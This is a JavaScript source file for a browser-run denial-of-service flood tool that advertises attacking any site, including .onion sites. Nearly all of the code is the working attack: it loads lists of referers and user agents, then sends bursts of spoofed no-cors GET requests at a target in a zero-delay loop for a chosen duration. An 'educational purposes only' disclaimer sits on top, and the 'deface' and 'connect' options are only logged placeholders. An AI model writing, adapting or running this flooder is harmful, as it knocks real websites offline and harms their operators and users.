// ddos any site including .onion sites
// USE referers.txt AND useragents.txt

// WARNING: This code is for educational purposes only.
// I am not responsible for any illegal or unethical use of this code.

async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false) {
  if (!target) {
    log('ERROR: Target URL is required.');
    return;
  }

  log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads.`);

  if (deface) {
    log('WARNING: Deface option is extremely illegal and unethical. Proceed with extreme caution and at your own risk. I am not responsible.');
    // Placeholder for deface functionality (NEVER IMPLEMENT THIS IN REALITY)
    log('Deface functionality is a placeholder. Not implemented for ethical reasons.');
  }

  if (connect) {
    log('WARNING: Attempting to connect directly is extremely illegal and unethical. Proceed with extreme caution and at your own risk. I am not responsible.');
     // Placeholder for direct connection functionality (NEVER IMPLEMENT THIS IN REALITY)
    log('Direct connect functionality is a placeholder. Not implemented for ethical reasons.');
  }


  const referers = await loadFile('referers.txt');
  const userAgents = await loadFile('useragents.txt');

  if (!referers || !userAgents) {
    log('ERROR: Could not load referers.txt or useragents.txt. Make sure these files exist.');
    return;
  }

  const attackStartTime = Date.now();
  let attackInterval = null;


  if (type === 'http') {
     attackInterval = setInterval(() => {
      for (let i = 0; i < threads; i++) {
        fetch(target, {
          method: 'GET', // or 'POST'
          mode: 'no-cors',
          headers: {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Referer': referers[Math.floor(Math.random() * referers.length)],
          },
        }).then(response => {
          // Log success or failure (optional)
          //console.log(`Request sent: ${response.status}`);
        }).catch(error => {
          // Log error
          //console.error('Request error:', error);
        });
      }
    }, 0); // Run as fast as possible
  } else if (type === 'onion') {
    log('Onion site attacks are complex and require specialized tools and proxies. This is a simplified HTTP flood. It might not be effective.');
    attackInterval = setInterval(() => {
      for (let i = 0; i < threads; i++) {
        fetch(target, {
          method: 'GET', // or 'POST'
          mode: 'no-cors',
          headers: {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Referer': referers[Math.floor(Math.random() * referers.length)],
          },
        }).then(response => {
          // Log success or failure (optional)
          //console.log(`Request sent: ${response.status}`);
        }).catch(error => {
          // Log error
          //console.error('Request error:', error);
        });
      }
    }, 0); // Run as fast as possible
  }
  else {
    log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'.`);
    clearInterval(attackInterval);
    return;
  }



  setTimeout(() => {
    clearInterval(attackInterval);
    log('DDoS attack finished.');
  }, duration * 1000);
}

async function loadFile(filename) {
  try {
    const response = await fetch(filename);
    const text = await response.text();
    return text.split('\n').filter(line => line.trim() !== '');
  } catch (error) {
    log(`ERROR: Could not load file ${filename}: ${error}`);
    return null;
  }
}

function log(message) {
  const logsElement = document.getElementById('logs');
  if (logsElement) {
    logsElement.innerHTML += message + '<br>';
    logsElement.scrollTop = logsElement.scrollHeight; // Auto-scroll
  } else {
    console.log(message);
  }
}

// Example usage (call this from your HTML with user input):
// ddosAttack(targetUrl, attackType, attackDuration, attackThreads, shouldDeface, shouldConnect);

// Expose the ddosAttack function globally (for calling from HTML)
window.ddosAttack = ddosAttack;